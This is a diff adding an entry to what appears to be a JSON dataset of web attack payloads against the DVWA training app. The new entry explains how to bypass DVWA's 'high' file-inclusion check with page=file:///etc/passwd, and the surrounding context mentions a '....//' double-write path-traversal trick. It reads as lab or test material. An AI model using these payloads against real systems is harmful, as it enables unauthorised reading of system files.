@@ -6,5 +6,12 @@
     "principle": "../ 黑名单过滤用 ....// 双写绕过（删除一层 ../ 后残留 ../）；include 路径穿越读本地文件",
     "source": "dvwa",
     "verify_url": "http://localhost:8081/vulnerabilities/fi/?page={payload}"
+  },
+  {
+    "id": "auto-20261030140619",
+    "context": "DVWA File Inclusion high：/vulnerabilities/fi/ 的 page 参数。high 校验 if(!fnmatch(\"file*\", $file) && $file != \"include.php\") 否则 exit。include($file) 直接包含。白名单用 fnmatch glob \"file*\"（只要求以 file 开头，* 匹配任意含 :/// 等）。绕过：page=file:///etc/passwd —— 字符串以 \"file\" 开头满足 fnmatch，include 触发 PHP file:// 流包装器读取本地 /etc/passwd，回显 root/daemon/www-data 等全部用户行。",
+    "reference_payload": "http://localhost:8081/vulnerabilities/fi/?page=file:///etc/passwd",
+    "principle": "fnmatch(\"file*\") 只匹配前缀 file，* 允许通配 ;用 PHP file:// 流包装器 \"file:///etc/passwd\" 既满足前缀又触发本地文件读取，绕过白名单",
+    "source": "dvwa"
   }
 ]
